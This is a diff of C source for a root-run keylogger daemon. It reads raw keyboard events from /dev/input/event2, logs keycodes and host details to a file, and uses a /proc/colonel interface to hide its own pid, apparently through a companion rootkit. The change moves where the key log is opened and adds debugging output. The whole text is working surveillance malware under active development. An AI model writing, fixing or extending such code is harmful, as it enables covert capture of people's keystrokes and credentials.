@@ -57,7 +57,6 @@ int main(void) {
 
 	dir = mkdir("./col_log", S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);	/* log directory */
 	fp = fopen("./col_log/log.txt", "a+"); 					/* daemon log */
-	evlog = fopen("./col_log/evlog.txt", "a+");  			/* key log */
 	fd = open("/dev/input/event2", O_RDONLY);				/* key event file */
 	ftty = open("/proc/colonel", O_WRONLY);					/* open for write to hide keylogger pid */
 
@@ -84,10 +83,6 @@ int main(void) {
 		fprintf(fp, "ERROR: user not root -- %s", ctime(&curtime));
 		return 1;
 	}
-	if (NULL == evlog) {
-		fprintf(fp, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
-		return 1;
-	}
 
 	while(1) {				
 		fflush(fp);
@@ -95,9 +90,16 @@ int main(void) {
 		ftty = open("/proc/colonel", O_RDONLY);				/* read from /proc/colonel */
 		read(ftty, cmd, sizeof(cmd));						/* read from /proc/colonel */
 		toggle = strstr(cmd, kl);							/* looks for change in /proc/colonel */
+        fprintf(fp, "In while (no if), ftty open and reading -- listening: %d, toggle: %s", listening, toggle);
 
 		if ((0 == listening) && (toggle != NULL)) {
+            fprintf(fp, "In 1st if -- listening: %d, toggle: %s", listening, toggle);
 			listening = !listening;
+            evlog = fopen("./col_log/evlog.txt", "a+");             /* key log */
+            if (NULL == evlog) {
+                fprintf(fp, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
+                return 1;
+            }
 			fprintf(evlog, "\n\n%s", ctime(&curtime));				/* timestamp */
 			fprintf(evlog, "%s\n%s\n%s | %s | %s\n\n-", 			/* system data */
 					unameData.nodename, unameData.version,
@@ -106,21 +108,27 @@ int main(void) {
 			fflush(evlog);
 			fprintf(fp, "Begin listening -- %s", ctime(&curtime));
 			close(ftty);
+            fprintf(fp, "Leaving 1st if, ftty closed -- listening: %d, toggle: %s", listening, toggle);
 			continue;
 
 		} else if ((1 == ev.type) && (1 == listening)) {	/* if typing (ev.type = 1) and keylogger is on */
-			fprintf(evlog, "%i,%i-", ev.code, ev.value);	/* grabs keyboard input -- 
+			fprintf(fp, "In 2nd if, ftty still closed -- listening: %d, toggle: %s", listening, toggle);
+            fprintf(evlog, "%i,%i-", ev.code, ev.value);	/* grabs keyboard input -- 
 															 * ev.code = keycode
 															 * ev.value = key state (0: key up, 1: key down) */
 			fflush(evlog);
 
 			ftty = open("/proc/colonel", O_RDONLY | O_NONBLOCK);
+            fprintf(fp, "In bottom of 2nd if, ftty open and non-blocking -- listening: %d, toggle: %s", listening, toggle);
 			if (NULL == toggle) {
 				listening = !listening;
+                fclose(evlog);
 				fprintf(fp, "End listening -- %s", ctime(&curtime));
-				fprintf(evlog, "\nEnd listening | %s", ctime(&curtime));
-				fflush(evlog);
+				// fprintf(evlog, "\nEnd listening | %s", ctime(&curtime));
+				// fflush(evlog);
+                fprintf(fp, "In nested if, ftty open -- listening: %d, toggle: %s", listening, toggle);
 				close(ftty);
+                fprintf(fp, "In nested if, ftty closed -- listening: %d, toggle: %s", listening, toggle);
 				continue;
 			}
 		}
